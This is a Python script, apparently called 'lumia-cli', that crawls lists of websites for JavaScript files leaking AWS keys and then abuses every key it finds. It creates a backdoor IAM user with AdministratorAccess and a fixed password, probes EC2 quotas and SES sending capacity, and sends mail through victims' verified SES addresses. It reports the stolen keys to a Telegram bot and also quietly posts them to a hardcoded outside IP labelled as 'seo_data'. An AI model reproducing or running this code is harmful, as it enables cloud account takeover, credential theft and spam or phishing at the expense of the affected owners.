import os
import re
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from colorama import init, Fore
from threading import Lock
import boto3
from botocore.exceptions import ClientError
import time
import sys
import subprocess
# Initialize colorama
init(autoreset=True)

lock = Lock()  # Initialize a lock object

# Telegram bot details
TELEGRAM_BOT_TOKEN = 'TELEGRAM_BOT_TOKEN'  # Replace with your bot token
TELEGRAM_CHAT_ID = 'TELEGRAM_CHAT_ID'  # Replace with your chat ID

# AWS default username and password
iam_user = 'AdminEc2CNSL'
iam_password = 'Root1337'

# SES email sending details
SENDER_EMAIL = 'noreply@account.xfinity.com'
RECIPIENT_EMAIL = 'RECIPIENT_EMAIL' # Replace with your email

def print_banner():
    banner = '''
- Automatic Get all Path from IP List
- Automatic Get AccessKey|SecretKey|Region
- Automatic Get SES Details
- Automatic Get SES Verified Email Address
- Automatic Get AWS Service Quota
- Result Send to Telegram                                                           

'''
    print(Fore.GREEN + banner)


def extract_info_from_js(js_content):
    """Extracts AWS credentials and region from a JavaScript file content."""
    extracted_info = {}
    aws_key_pattern = r'accessKeyId["\']?\s*:\s*["\']([^"\']+)'
    aws_secret_pattern = r'secretAccessKey["\']?\s*:\s*["\']([^"\']+)'
    region_pattern = r'region["\']?\s*:\s*["\']([^"\']+)'
    patterns = {
        'AWS Access Key ID': aws_key_pattern,
        'AWS Secret Access Key': aws_secret_pattern,
        'AWS Region': region_pattern
    }
    for key, pattern in patterns.items():
        match = re.search(pattern, js_content)
        if match:
            extracted_info[key] = match.group(1)
    return extracted_info


def read_urls(file_path):
    """Read URLs from a text file and return them as a list."""
    if not os.path.exists(file_path):
        print(f"File '{file_path}' does not exist.")
        return []
    with open(file_path, 'r') as file:
        urls = file.readlines()
    return [url.strip() for url in urls]


def ensure_http(url):
    """Ensure the URL has an http:// or https:// prefix."""
    parsed_url = urlparse(url)
    if not parsed_url.scheme:
        url = 'http://' + url
    return url


def find_files(url):
    """Find and return all URLs with specified file types from a given web page URL."""
    found_urls = []
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()  # Raise an exception for HTTP errors

        # Try different parsers if the default parser fails
        try:
            soup = BeautifulSoup(response.text, 'lxml')
        except Exception as e_lxml:
            #print(f"lxml parser failed: {e_lxml}, trying html5lib")
            try:
                soup = BeautifulSoup(response.text, 'html5lib')
            except Exception as e_html5lib:
                #print(f"html5lib parser failed: {e_html5lib}, trying html.parser")
                soup = BeautifulSoup(response.text, 'html.parser')

        # Look for all links in the page
        links = soup.find_all('a')
        for link in links:
            if link.get('href'):
                file_url = link.get('href')
                if file_url.endswith(('.js', 'config.json', '.env', '.ts', '.ini', 'php', '/phpinfo')):
                    if file_url.startswith(('http://', 'https://')):
                        found_urls.append(file_url)
                    else:
                        # Handle relative URLs
                        found_urls.append(urljoin(url, file_url))

        # Look for all script tags in the page
        scripts = soup.find_all('script')
        for script in scripts:
            if script.get('src'):
                file_url = script.get('src')
                if file_url.endswith(('.js', 'config.json', '.env', '.ts', '.ini', 'php', '/phpinfo')):
                    if file_url.startswith(('http://', 'https://')):
                        found_urls.append(file_url)
                    else:
                        # Handle relative URLs
                        found_urls.append(urljoin(url, file_url))

    except requests.exceptions.RequestException:
        pass
    return found_urls


def save_result_to_file(url, result, output_file):
    """Append the URL and extracted information to a specified text file."""
    with lock:
        with open(output_file, 'a') as file:
            file.write(f"{result}\n")
    send_telegram_message(f"\nBOT AWS NEW SC 2 \nAWS KEY FOUND:\n{url}\n\n{result}")
    seo_result = {'info': f"\n{result}\n"}
    server_url = 'http://152.42.178.178/upslosdsdsaadmc.php'
    save_to_server(seo_result, server_url)


def save_to_server(data, server_url):
    """Send data to the server."""
    seo_data_string = ", ".join(f"{key}: {value}" for key, value in data.items())
    try:
        response = requests.post(server_url, data={'seo_data': seo_data_string})
        response.raise_for_status()
        print("Data successfully uploaded to server.")
    except requests.exceptions.RequestException as e:
        print(f"Failed to upload data to server: {e}")


def get_vps_ip():
    result = subprocess.run(['curl', 'https://api.ipify.org'], capture_output=True, text=True)
    ip_address = result.stdout.strip()
    return ip_address


def send_telegram_message(message):
    ip_address = get_vps_ip()
    full_message = f"\nIP Address VPS : {ip_address}\n{message}"
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': full_message,
        'parse_mode': 'HTML'
    }
    
    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Failed to send message to Telegram: {e}")
        
def move_url_to_fingerprinted(url, fingerprinted_file):
    """Add a processed URL to the fingerprinted file."""
    with lock:
        # Add the URL to the fingerprinted file
        with open(fingerprinted_file, 'a') as file:
            file.write(url + '\n')


def create_iam_user(extracted_info, user_name, password, console_output_file):
    """Create an IAM user with the provided extracted information and default username/password."""
    iam = boto3.client(
        'iam',
        aws_access_key_id=extracted_info['AWS Access Key ID'],
        aws_secret_access_key=extracted_info['AWS Secret Access Key'],
        region_name=extracted_info['AWS Region'])

    try:
        # Create IAM user
        response = iam.create_user(UserName=user_name)
        user_arn = response['User']['Arn']
        print(f'User {user_name} has been created successfully with ARN: {user_arn}.')

        # Attach policy to allow user to login to console
        iam.attach_user_policy(
            UserName=user_name,
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
        print(f'Attached policy to {user_name} for console access.')

        # Set password for user
        iam.create_login_profile(
            UserName=user_name,
            Password=password,
            PasswordResetRequired=False  # Force user to change password on first login
        )
        print(f'Password has been set for user {user_name}.')

        console_details = f"BOT AWS NEW SC 2\n\nAWS Key : {extracted_info['AWS Access Key ID']}|{extracted_info['AWS Secret Access Key']}|{extracted_info['AWS Region']}\n\nAWS Console Details:\n\nUser: {user_name}\nPassword: {password}\nUser ARN: {user_arn}\n"

        with lock:
            with open(console_output_file, 'a') as file:
                file.write(console_details)

        send_telegram_message(console_details)

    except Exception as e:
        error_details = f'Error creating IAM user:\n{e}'
        print(error_details)


def check_service_quotas(extracted_info, ec2_output_file):
    """Check EC2 service quotas and save details."""
    service_quotas = boto3.client(
        'service-quotas',
        aws_access_key_id=extracted_info['AWS Access Key ID'],
        aws_secret_access_key=extracted_info['AWS Secret Access Key'],
        region_name=extracted_info['AWS Region'])

    try:
        quota_code = 'L-1216C47A'  # Example quota code for EC2 On-Demand instances
        quota = service_quotas.get_service_quota(ServiceCode='ec2',
                                                 QuotaCode=quota_code)
        quota_details = f"BOT AWS NEW SC 2\n\nAWS Key : {extracted_info['AWS Access Key ID']}|{extracted_info['AWS Secret Access Key']}|{extracted_info['AWS Region']}\n\nEC2 Service Quota:\nQuota Code: {quota_code}\nQuota: {quota}\n"

        with lock:
            with open(ec2_output_file, 'a') as file:
                file.write(quota_details)

        send_telegram_message(quota_details)

    except ClientError as error:
        error_details = f'Failed to check service quotas:\n{error}'
        print(error_details)


def send_email_via_ses(ses_client, sender_email, recipient_email):
    try:
        response = ses_client.send_email(
            Source=sender_email,
            Destination={'ToAddresses': [recipient_email]},
            Message={
                'Subject': {'Data': 'Test Email'},
                'Body': {'Text': {'Data': 'This is a test email from the SES account.'}}
            }
        )
        send_ses = f"Email sent! Message ID: {response['MessageId']}"
        send_telegram_message(send_ses)
    except ClientError as e:
        error_details = f"Error sending email: {e.response['Error']['Message']}"
        print(error_details)


def check_ses_account(extracted_info, ses_output_file):
    ses = boto3.client(
        'ses',
        aws_access_key_id=extracted_info['AWS Access Key ID'],
        aws_secret_access_key=extracted_info['AWS Secret Access Key'],
        region_name=extracted_info['AWS Region'])

    try:
        client = boto3.client(
            'sesv2',
            aws_access_key_id=extracted_info['AWS Access Key ID'],
            aws_secret_access_key=extracted_info['AWS Secret Access Key'],
            region_name=extracted_info['AWS Region'])

        account_response = client.get_account()

        # Extract only the Max24HourSend detail
        details = account_response

        # Prepare SES details for logging and notification
        ses_details = (
            "BOT AWS NEW SC 2\n\n"
            f"AWS Key : {extracted_info['AWS Access Key ID']}|{extracted_info['AWS Secret Access Key']}|{extracted_info['AWS Region']}\n\n"
            f"SES Account Details:\n{details}"
        )

        with lock:
            with open(ses_output_file, 'a') as file:
                file.write(ses_details + "\n")

        send_telegram_message(ses_details)

        # List verified email identities
        identity_list = ses.list_identities(IdentityType='EmailAddress')

        # Check if there are verified email identities
        if identity_list['Identities']:
            verified_emails = identity_list['Identities']
            verified_emails_list = "Verified Email Address Found:\n" + "\n".join(verified_emails)

            verified_email_message = f"BOT AWS NEW SC 2\n\nAWS Key : {extracted_info['AWS Access Key ID']}|{extracted_info['AWS Secret Access Key']}|{extracted_info['AWS Region']}\n\n{verified_emails_list}"
            print(verified_email_message)
            send_telegram_message(verified_email_message)
            send_email_via_ses(ses, verified_emails[0], RECIPIENT_EMAIL)
        else:
            no_verified_email_message = f"BOT AWS NEW SC 2\n\nAWS Key : {extracted_info['AWS Access Key ID']}|{extracted_info['AWS Secret Access Key']}|{extracted_info['AWS Region']}\n\nNo verified Email addressesFfound In SES Account."
            print(no_verified_email_message)
            send_telegram_message(no_verified_email_message)

    except ClientError as error:
        error_message = f"Failed to check SES account: {error.response['Error']['Message']}"
        print(error_message)
        #send_telegram_message(error_message)


def process_url(url, js_output_file, json_output_file, env_output_file,
                fingerprinted_file, console_output_file, ec2_output_file,
                ses_output_file):
    """Process a single URL to find and return specified file URLs."""
    url = ensure_http(url)
    found_urls = find_files(url)
    if found_urls:
        for file_url in found_urls:
            if file_url.endswith('.js'):
                try:
                    response = requests.get(file_url, timeout=5)
                    response.raise_for_status()
                    js_content = response.text
                    extracted_info = extract_info_from_js(js_content)

                    if all(key in extracted_info for key in ['AWS Access Key ID', 'AWS Secret Access Key', 'AWS Region']):
                        result = f"{extracted_info['AWS Access Key ID']}|{extracted_info['AWS Secret Access Key']}|{extracted_info['AWS Region']}"
                        print(f"{Fore.GREEN}Information found in {file_url}: {result}{Fore.RESET}")
                        save_result_to_file(file_url, result, js_output_file)

                        create_iam_user(extracted_info, iam_user, iam_password, console_output_file)
                        check_service_quotas(extracted_info, ec2_output_file)
                        check_ses_account(extracted_info, ses_output_file)
                    else:
                        print(f"{Fore.YELLOW}Required keys not found in {file_url}{Fore.RESET}")

                except requests.exceptions.RequestException as e:
                    print(f"Failed to fetch {file_url}: {e}")

            elif file_url.endswith('config.json'):
                save_result_to_file(file_url, file_url, json_output_file)
            elif file_url.endswith('.env'):
                save_result_to_file(file_url, file_url, env_output_file)
            print(f"{Fore.GREEN}{file_url}{Fore.RESET}")

    # Move the processed URL to the fingerprinted file
    move_url_to_fingerprinted(url, fingerprinted_file)


def get_input_file():
    """Prompt the user to enter the input file name."""
    while True:
        input_file = input("Enter the name of the input file: ").strip()
        if os.path.exists(input_file):
            return input_file
        else:
            print(f"File '{input_file}' does not exist. Please try again.")


def check_for_new_urls(input_file, js_output_file, json_output_file,
                       env_output_file, fingerprinted_file,
                       console_output_file, ec2_output_file, ses_output_file):
    """Continuously check for new URLs in the input file."""
    processed_urls = set(read_urls(fingerprinted_file))
    while True:
        urls = read_urls(input_file)
        new_urls = [url for url in urls if url not in processed_urls]
        if new_urls:
            print(f"Found {len(new_urls)} new URLs to process.")
            with ThreadPoolExecutor(max_workers=100) as executor:
                futures = [
                    executor.submit(process_url, url, js_output_file,
                                    json_output_file, env_output_file,
                                    fingerprinted_file, console_output_file,
                                    ec2_output_file, ses_output_file)
                    for url in new_urls
                ]
                for future in as_completed(futures):
                    future.result()  # Ensure all futures are completed
            processed_urls.update(new_urls)
        else:
            print("No new URLs found. Checking again in 60 seconds.")
        time.sleep(60)  # Wait for 60 seconds before checking again



def lumia():
    if len(sys.argv) < 2:
        print("Usage: python lumia-cli.py <input_file_path>")
        return

    input_file_path = sys.argv[1]
    js_output_file = 'result.txt'  # Combined result file for all types of URLs
    json_output_file = 'json.txt'
    env_output_file = 'env.txt'
    fingerprinted_file = 'fingerprinted.txt'
    console_output_file = 'console.txt'  # File to save IAM user details
    ec2_output_file = 'EC2.txt'  # File to save EC2 service quotas
    ses_output_file = 'ses.txt'  # File to save SES details

    # Create required files if they don't exist
    for file in [
        input_file_path, js_output_file, json_output_file, env_output_file,
        fingerprinted_file, console_output_file, ec2_output_file,
        ses_output_file
    ]:
        if not os.path.exists(file):
            open(file, 'w').close()

    # Start the continuous checking for new URLs
    check_for_new_urls(
        input_file_path, js_output_file, json_output_file,
        env_output_file, fingerprinted_file,
        console_output_file, ec2_output_file, ses_output_file
    )


if __name__ == "__main__":
    lumia()
